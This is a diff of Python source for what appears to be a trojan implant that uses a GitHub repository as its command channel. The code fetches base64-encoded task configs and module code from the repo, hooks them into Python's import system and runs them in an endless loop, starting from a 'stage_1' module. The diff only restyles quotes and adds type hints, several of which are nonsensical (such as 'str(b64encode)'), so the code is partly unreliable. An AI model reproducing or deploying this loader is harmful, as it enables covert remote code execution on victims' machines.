@@ -21,24 +21,24 @@ def github_connect() -> object:
 
 def retrieve_contents(file_path: str) -> str(b64encode):
     repo = github_connect()
-    branch = repo.branch("main")
+    branch = repo.branch('main')
     tree = branch.commit.commit.tree.to_tree().recurse()
     
     for filename in tree.tree:      
         if file_path in filename.path:
-            print(f"[+] Found file {file_path}")
-            blob = repo.blob(filename._json_data["sha"])
+            print(f'[+] Found file {file_path}')
+            blob = repo.blob(filename._json_data['sha'])
             return blob.content
 
 
 class GitImporter(object):
     def __init__(self) -> None:
-        self.current_module_contents = ""
+        self.current_module_contents: str = ''
     
     def find_module(self, module: str, path=None) -> object:
-        print(f"[&] Attempting to retrieve {module}")
+        print(f'[&] Attempting to retrieve {module}')
         
-        module_contents = retrieve_contents(f"modules/{module}")         
+        module_contents = retrieve_contents(f'modules/{module}')         
         
         if module_contents:
             self.current_module_contents = b64decode(module_contents)        
@@ -59,20 +59,20 @@ class GitImporter(object):
 class ClientHandler:
 
     def __init__(self,) -> None:
-        self.client_id = None
-        self.repo = github_connect()
-        self.task_queue = Queue()
-        self.config_path = f'config/{self.client_id}.json'
-        self.data_path = f'data/{self.client_id}'
+        self.client_id: str = None
+        self.repo: object = github_connect()
+        self.task_queue: Queue = Queue()
+        self.config_path: str = f'config/{self.client_id}.json'
+        self.data_path: str = f'data/{self.client_id}'
 
     def get_client_config(self) -> list(dict()):
-        config_json = retrieve_contents(self.config_path)
+        config_json: str(b64encode) = retrieve_contents(self.config_path)
         
         if config_json == None:
-            configuration = [{'module':'stage_1'}]
+            configuration: list(dict()) = [{'module':'stage_1'}]
         
         else:
-            configuration = loads(b64decode(config_json))
+            configuration: list(dict()) = loads(b64decode(config_json))
         
         for tasks in configuration:
             if tasks['module'] not in sys.modules:
@@ -118,13 +118,14 @@ class ClientHandler:
 
 def main() -> None:
     sys.meta_path = [GitImporter()]
+    
     client: object = ClientHandler()
-    module_list: list = [] 
+    module_list: list(str) = [] 
     
     while True:
         
         if client.task_queue.empty():
-            config: object = client.get_client_config()
+            config: list(dict()) = client.get_client_config()
             
             for task in config:
                 
